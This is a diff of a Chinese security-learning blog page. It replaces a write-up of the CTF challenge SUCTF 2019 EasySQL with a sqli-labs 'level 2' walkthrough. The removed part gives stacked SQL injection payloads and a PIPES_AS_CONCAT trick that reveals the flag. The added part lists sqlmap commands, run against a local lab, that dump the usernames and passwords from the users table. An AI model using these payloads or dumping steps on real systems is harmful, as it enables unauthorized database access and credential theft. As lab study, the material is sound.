@@ -17,7 +17,7 @@
   <meta name="description" content="BLOG">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>BUU每日一题004 - lll-nnnのblog</title>
+  <title>Leve2 - lll-nnnのblog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUU每日一题004">
+            <span class="h2" id="subtitle" title="Leve2">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-18 15:17" pubdate>
-        2021年1月18日 下午
+      <time datetime="2021-01-18 18:16" pubdate>
+        2021年1月18日 晚上
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      194 字
+      131 字
     </span>
   
 
@@ -224,22 +224,16 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUU每日一题004</h1>
+            <h1 style="display: none">Leve2</h1>
             
             <div class="markdown-body">
-              <h2 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h2><ul>
-<li>题目：[SUCTF 2019]EasySQL<br><img src="https://ftp.bmp.ovh/imgs/2021/01/756a703b3be17b15.png" srcset="/img/loading.gif"><br>又是挨打的一天，哎       </li>
-<li>分析<br>试了几下，发现了四种回显，<br><img src="https://ftp.bmp.ovh/imgs/2021/01/a072e95bbf3c2e3e.png" srcset="/img/loading.gif"><br><img src="https://ftp.bmp.ovh/imgs/2021/01/3d393a1fd8f639c1.png" srcset="/img/loading.gif"><br>第三种输出<code>Nonono</code>;第四种无输出；看到0和1，本来以为是布尔值注入，但弄了半天也没个结果，还是去看WP吧     </li>
-<li>解<br>原来可以堆叠注入，居然没想到……..<br>然后<code>1;show databases;</code>得到库；<code>1;show tables;</code>得到个Flag表<img src="https://ftp.bmp.ovh/imgs/2021/01/4c78cf42207b044f.png" srcset="/img/loading.gif"><br><code>1;select * from Flag;</code>发现得不到flag；看WP说是过滤了flag、from等；而且比赛时源码泄露了？？<br>源码：<code>select $_GET[&#39;query&#39;] || flag from flag</code><br>payload1:<code>*,1</code>     </li>
-</ul>
-<p>payload2:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
-<p>得到flag<img src="https://ftp.bmp.ovh/imgs/2021/01/a7cdd5bc1578ebf6.png" srcset="/img/loading.gif">       </p>
-<ul>
-<li><p>知识点</p>
-<p>  在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。</p>
-<p>  但在mysql 缺省不支持。需要调整mysql 的sql_mode<br>  模式：pipes_as_concat 来实现oracle 的一些功能。</p>
-</li>
-</ul>
+              <h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><h3 id="用sqlmap过第二关："><a href="#用sqlmap过第二关：" class="headerlink" title="用sqlmap过第二关："></a>用sqlmap过第二关：</h3><ol>
+<li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 --dbs</code><br>得到数据库<br><img src="https://ftp.bmp.ovh/imgs/2021/01/e826d7b6614685d0.png" srcset="/img/loading.gif"></li>
+<li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security --tables</code><br>获取<code>security</code>下的表<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f86812760a0593bb.png" srcset="/img/loading.gif"></li>
+<li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users --columns</code><br>获取<code>users</code>表中的列名<br>[<img src="https://s3.ax1x.com/2021/01/18/scp4eI.png" srcset="/img/loading.gif">]</li>
+<li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C password --dump</code><br>获取<code>password</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc99YT.png" srcset="/img/loading.gif">]</li>
+<li><code>sqlmap.py --batch -u http://127.0.0.1/sqli-labs-master/Less-2/?id=1 -D security -T users -C username --dump</code><br>获取<code>username</code><br>[<img src="https://s3.ax1x.com/2021/01/18/sc9ou9.png" srcset="/img/loading.gif">]</li>
+</ol>
 
             </div>
             <hr>
@@ -263,18 +257,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/18/leve2/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Leve2</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/17/leve1/">
-                        <span class="hidden-mobile">Leve1</span>
+                      <a href="/2021/01/18/BUU004/">
+                        <span class="hidden-mobile">BUU每日一题004</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
